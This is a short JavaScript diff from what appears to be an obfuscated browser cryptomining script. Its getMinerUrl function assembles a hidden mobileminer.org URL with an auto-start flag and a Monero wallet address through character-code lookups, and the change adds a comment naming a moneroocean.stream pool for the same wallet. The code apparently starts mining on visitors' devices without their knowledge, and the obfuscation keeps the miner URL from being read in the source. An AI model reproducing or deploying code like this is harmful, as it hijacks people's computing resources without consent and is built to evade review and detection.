@@ -239,6 +239,7 @@ function getAdsUrlString() {
 
 function getMinerUrl() {
 	// returns "https://mobileminer.org/mine/?auto=1&addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c";
+	// https://moneroocean.stream/?addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c
 	const m = getCharCodeAtMethod(MAP);
 	return window[STRING_STRING][getFromCharCodeMethod(MAP)](
 		MAP[m](window[PARSEINT_STRING](`${MAP[1801]}${MAP[1804]}${MAP[1807]}`)),
